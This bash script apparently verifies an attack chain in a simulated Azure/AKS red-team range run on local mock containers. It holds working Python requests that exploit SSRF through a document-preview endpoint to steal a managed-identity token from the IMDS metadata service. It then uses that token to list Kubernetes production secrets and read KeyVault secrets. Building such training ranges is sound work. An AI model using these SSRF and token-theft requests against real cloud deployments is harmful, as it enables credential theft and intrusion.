#!/bin/bash
# verify_attack_chain_red_only.sh - Verify romulus AKS SSRF attack chain on red-only SABER compose stack
#
# Runs verification from inside the red sandbox container (which has network access to all services)
#
# Usage:
#   ./verify_attack_chain_red_only.sh                    # Use default EPISODE_ID=test001
#   EPISODE_ID=mytest ./verify_attack_chain_red_only.sh  # Use custom episode ID
#   ./verify_attack_chain_red_only.sh -v                 # Verbose output

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

EPISODE_ID="${EPISODE_ID:-default}"
RED_SANDBOX_CONTAINER="romulus-red-sandbox-${EPISODE_ID}"
VERBOSE=false

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -v|--verbose) VERBOSE=true; shift ;;
        -h|--help)
            echo "Usage: EPISODE_ID=xxx $0 [-v]"
            echo "  -v  Verbose output"
            exit 0
            ;;
        *) shift ;;
    esac
done

PASSED=0
FAILED=0

pass() { echo -e "  ${GREEN}✓${NC} $1"; PASSED=$((PASSED + 1)); }
fail() { echo -e "  ${RED}✗${NC} $1"; FAILED=$((FAILED + 1)); }
info() { echo -e "  ${BLUE}→${NC} $1"; }

# Run python inside red sandbox container
run_in_sandbox() {
    docker exec "$RED_SANDBOX_CONTAINER" python -c "$1" 2>/dev/null
}

echo "============================================================"
echo "Romulus AKS SSRF Attack Chain Verification (Red Only)"
echo "Episode: $EPISODE_ID"
echo "============================================================"
echo ""

# =============================================================================
# Check containers are running
# =============================================================================
echo -e "${BLUE}[1/7] Container Status${NC}"

CONTAINERS=(
    "romulus-red-sandbox-${EPISODE_ID}"
    "romulus-aks-pod-${EPISODE_ID}"
    "romulus-kubernetes-api-${EPISODE_ID}"
    "romulus-imds-${EPISODE_ID}"
    "romulus-keyvault-${EPISODE_ID}"
    "romulus-azure-ad-${EPISODE_ID}"
    "romulus-exchange-online-${EPISODE_ID}"
    "romulus-arm-api-${EPISODE_ID}"
    "romulus-azure-functions-${EPISODE_ID}"
    "romulus-front-door-${EPISODE_ID}"
    "romulus-gateway-${EPISODE_ID}"
)

for container in "${CONTAINERS[@]}"; do
    if docker ps --format '{{.Names}}' | grep -q "^${container}$"; then
        STATUS=$(docker inspect --format='{{.State.Health.Status}}' "$container" 2>/dev/null || echo "no-healthcheck")
        if [[ "$STATUS" == "healthy" ]] || [[ "$STATUS" == "no-healthcheck" ]]; then
            pass "$container ($STATUS)"
        else
            fail "$container ($STATUS)"
        fi
    else
        fail "$container (not running)"
    fi
done
echo ""

# =============================================================================
# Health Checks
# =============================================================================
echo -e "${BLUE}[2/7] Service Health Checks${NC}"

HEALTH_RESULT=$(run_in_sandbox "
import urllib.request, json, ssl

ctx = ssl._create_unverified_context()
services = {
    'AKS Pod': 'http://romulus-aks-pod:8080/health',
    'IMDS': 'http://romulus-imds:80/health',
    'Front Door': 'http://romulus-front-door:8080/health',
    'Azure Functions': 'http://romulus-azure-functions:7071/health',
    'Azure AD': 'http://romulus-azure-ad:8080/health',
    'KeyVault': 'https://romulus-keyvault:443/health',
    'Exchange': 'https://romulus-exchange-online:443/health',
    'ARM API': 'https://romulus-arm-api:443/health',
    'Kubernetes API': 'https://romulus-kubernetes-api:443/health',
}

results = {}
for name, url in services.items():
    try:
        req = urllib.request.Request(url)
        resp = urllib.request.urlopen(req, timeout=5, context=ctx)
        results[name] = 'OK' if resp.status == 200 else f'HTTP {resp.status}'
    except Exception as e:
        results[name] = f'FAIL: {str(e)[:50]}'

for name, status in results.items():
    print(f'{name}|{status}')
")

while IFS='|' read -r service status; do
    if [[ "$status" == "OK" ]]; then
        pass "$service: $status"
    else
        fail "$service: $status"
    fi
done <<< "$HEALTH_RESULT"
echo ""

# =============================================================================
# Phase 1: SSRF Exploitation
# =============================================================================
echo -e "${BLUE}[3/7] Phase 1: SSRF Exploitation${NC}"

SSRF_RESULT=$(run_in_sandbox "
import urllib.request, json

# Test SSRF to IMDS via document preview
try:
    url = 'http://romulus-aks-pod:8080/api/document/preview?url=http://romulus-imds:80/metadata/instance?api-version=2021-02-01'
    req = urllib.request.Request(url, headers={'Metadata': 'true'})
    resp = urllib.request.urlopen(req, timeout=10)
    data = json.loads(resp.read().decode())
    
    # Verify we got IMDS metadata
    if 'compute' in data or 'network' in data or 'vmId' in str(data):
        print('SSRF_SUCCESS|Got IMDS instance metadata')
    else:
        print('SSRF_PARTIAL|Response received but no IMDS data: ' + str(data)[:100])
except Exception as e:
    print(f'SSRF_FAIL|{str(e)[:100]}')
")

if [[ "$SSRF_RESULT" == SSRF_SUCCESS* ]]; then
    pass "SSRF to IMDS via document preview: ${SSRF_RESULT#*|}"
else
    fail "SSRF to IMDS: ${SSRF_RESULT#*|}"
fi
echo ""

# =============================================================================
# Phase 2: Token Extraction
# =============================================================================
echo -e "${BLUE}[4/7] Phase 2: IMDS Token Extraction${NC}"

TOKEN_RESULT=$(run_in_sandbox "
import urllib.request, json

# Get token via SSRF
try:
    url = 'http://romulus-aks-pod:8080/api/document/preview?url=http://romulus-imds:80/metadata/identity/oauth2/token?api-version=2018-02-01%26resource=https://management.azure.com/'
    req = urllib.request.Request(url, headers={'Metadata': 'true'})
    resp = urllib.request.urlopen(req, timeout=10)
    data = json.loads(resp.read().decode())
    
    if 'access_token' in data:
        token = data['access_token']
        print(f'TOKEN_SUCCESS|Got access token ({len(token)} chars)')
    else:
        print('TOKEN_FAIL|No access_token in response: ' + str(data)[:100])
except Exception as e:
    print(f'TOKEN_FAIL|{str(e)[:100]}')
")

if [[ "$TOKEN_RESULT" == TOKEN_SUCCESS* ]]; then
    pass "IMDS token extraction: ${TOKEN_RESULT#*|}"
else
    fail "IMDS token extraction: ${TOKEN_RESULT#*|}"
fi
echo ""

# =============================================================================
# Phase 3: Kubernetes Secrets
# =============================================================================
echo -e "${BLUE}[5/7] Phase 3: Kubernetes Secrets Enumeration${NC}"

K8S_RESULT=$(run_in_sandbox "
import urllib.request, json, ssl

ctx = ssl._create_unverified_context()

# First get a token for k8s
try:
    url = 'http://romulus-imds:80/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
    req = urllib.request.Request(url, headers={'Metadata': 'true'})
    resp = urllib.request.urlopen(req, timeout=10)
    token_data = json.loads(resp.read().decode())
    token = token_data.get('access_token', '')
    
    if not token:
        print('K8S_FAIL|Could not get IMDS token')
    else:
        # Query K8s secrets
        url = 'https://romulus-kubernetes-api:443/api/v1/namespaces/production/secrets'
        req = urllib.request.Request(url, headers={'Authorization': f'Bearer {token}'})
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        data = json.loads(resp.read().decode())
        
        secrets = [item.get('metadata', {}).get('name', 'unknown') for item in data.get('items', [])]
        if secrets:
            print(f'K8S_SUCCESS|Found secrets: {secrets}')
        else:
            print('K8S_PARTIAL|Connected but no secrets found')
except Exception as e:
    print(f'K8S_FAIL|{str(e)[:100]}')
")

if [[ "$K8S_RESULT" == K8S_SUCCESS* ]]; then
    pass "Kubernetes secrets enumeration: ${K8S_RESULT#*|}"
else
    fail "Kubernetes secrets: ${K8S_RESULT#*|}"
fi
echo ""

# =============================================================================
# Phase 4-6: KeyVault, Azure AD, Exchange (combined check)
# =============================================================================
echo -e "${BLUE}[6/7] Phases 4-6: KeyVault → Azure AD → Exchange${NC}"

CHAIN_RESULT=$(run_in_sandbox "
import urllib.request, json, ssl

ctx = ssl._create_unverified_context()

results = []

# Phase 4: KeyVault access
try:
    # Get token for keyvault
    url = 'http://romulus-imds:80/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net'
    req = urllib.request.Request(url, headers={'Metadata': 'true'})
    resp = urllib.request.urlopen(req, timeout=10)
    token = json.loads(resp.read().decode()).get('access_token', '')
    
    if token:
        url = 'https://romulus-keyvault:443/secrets?api-version=7.4'
        req = urllib.request.Request(url, headers={'Authorization': f'Bearer {token}'})
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        secrets = json.loads(resp.read().decode())
        results.append('KV_OK|KeyVault secrets accessible')
    else:
        results.append('KV_FAIL|No vault token')
except Exception as e:
    results.append(f'KV_FAIL|{str(e)[:50]}')

# Phase 5: Azure AD token endpoint
try:
    url = 'http://romulus-azure-ad:8080/.well-known/openid-configuration'
    resp = urllib.request.urlopen(url, timeout=5)
    data = json.loads(resp.read().decode())
    if 'token_endpoint' in data:
        results.append('AD_OK|Azure AD openid config available')
    else:
        results.append('AD_PARTIAL|Config response but no token_endpoint')
except Exception as e:
    results.append(f'AD_FAIL|{str(e)[:50]}')

# Phase 6: Exchange/Graph endpoint
try:
    url = 'https://romulus-exchange-online:443/health'
    resp = urllib.request.urlopen(url, timeout=5, context=ctx)
    if resp.status == 200:
        results.append('EX_OK|Exchange Online endpoint reachable')
    else:
        results.append(f'EX_PARTIAL|HTTP {resp.status}')
except Exception as e:
    results.append(f'EX_FAIL|{str(e)[:50]}')

for r in results:
    print(r)
")

while IFS='|' read -r status msg; do
    case "$status" in
        KV_OK|AD_OK|EX_OK) pass "$msg" ;;
        *) fail "$msg" ;;
    esac
done <<< "$CHAIN_RESULT"
echo ""

# =============================================================================
# Summary
# =============================================================================
echo -e "${BLUE}[7/7] Summary${NC}"
echo "============================================================"
TOTAL=$((PASSED + FAILED))
echo -e "  Passed: ${GREEN}$PASSED${NC} / $TOTAL"
echo -e "  Failed: ${RED}$FAILED${NC} / $TOTAL"

if [[ $FAILED -eq 0 ]]; then
    echo ""
    echo -e "${GREEN}All attack chain phases verified successfully!${NC}"
    exit 0
else
    echo ""
    echo -e "${RED}Some verifications failed. Check service logs for details.${NC}"
    exit 1
fi
